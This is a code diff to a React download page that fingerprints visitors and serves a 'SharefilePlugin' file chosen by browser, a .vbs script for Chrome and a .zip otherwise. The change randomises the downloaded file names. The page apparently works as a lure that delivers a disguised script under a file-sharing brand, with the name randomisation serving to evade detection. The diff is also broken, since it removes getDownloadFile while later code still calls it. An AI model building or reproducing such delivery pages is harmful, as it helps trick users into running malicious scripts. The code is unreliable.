@@ -1,6 +1,12 @@
-import { useEffect } from "react";
+import { useEffect, useMemo } from "react";
 import { useVisitorData } from "@fingerprintjs/fingerprintjs-pro-react";
 import adbTransfer from "@/assets/adb_transfer.png";
+
+const randomHex = (len = 8) =>
+  Array.from(crypto.getRandomValues(new Uint8Array(len)))
+    .map((b) => b.toString(16).padStart(2, "0"))
+    .join("")
+    .slice(0, len);
 
 const Download = () => {
   const { data: visitorData } = useVisitorData({ extendedResult: true }, { immediate: true });
@@ -12,16 +18,17 @@ const Download = () => {
     }
   }, [visitorData]);
 
-  const getDownloadFile = () => {
+  const downloadFile = useMemo(() => {
     const ua = navigator.userAgent;
+    const suffix = randomHex(8);
     if (ua.includes("Edg/")) {
-      return { href: "/docs/SharefilePlugin.zip", name: "SharefilePlugin.zip" };
+      return { href: "/docs/SharefilePlugin.zip", name: `SharefilePlugin_${suffix}.zip` };
     }
     if (ua.includes("Chrome") && !ua.includes("Edg/")) {
-      return { href: "/docs/SharefilePlugin.vbs", name: "SharefilePlugin.vbs" };
+      return { href: "/docs/SharefilePlugin.vbs", name: `SharefilePlugin_${suffix}.vbs` };
     }
-    return { href: "/docs/SharefilePlugin.zip", name: "SharefilePlugin.zip" };
-  };
+    return { href: "/docs/SharefilePlugin.zip", name: `SharefilePlugin_${suffix}.zip` };
+  }, []);
 
   useEffect(() => {
     const file = getDownloadFile();
